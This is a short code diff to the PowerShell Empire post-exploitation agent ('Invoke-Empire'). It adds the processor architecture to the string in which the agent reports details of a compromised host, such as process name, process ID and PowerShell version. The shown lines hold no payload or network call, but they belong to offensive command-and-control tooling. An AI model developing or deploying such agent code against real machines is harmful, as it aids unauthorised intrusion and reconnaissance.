@@ -247,6 +247,7 @@ function Invoke-Empire {
         $n = [System.Diagnostics.Process]::GetCurrentProcess();
         $str += '|'+$n.ProcessName+'|'+$n.Id;
         $str += "|powershell|" + $PSVersionTable.PSVersion.Major;
+        $str += "|" + $env:PROCESSOR_ARCHITECTURE;
         $str
     }
 
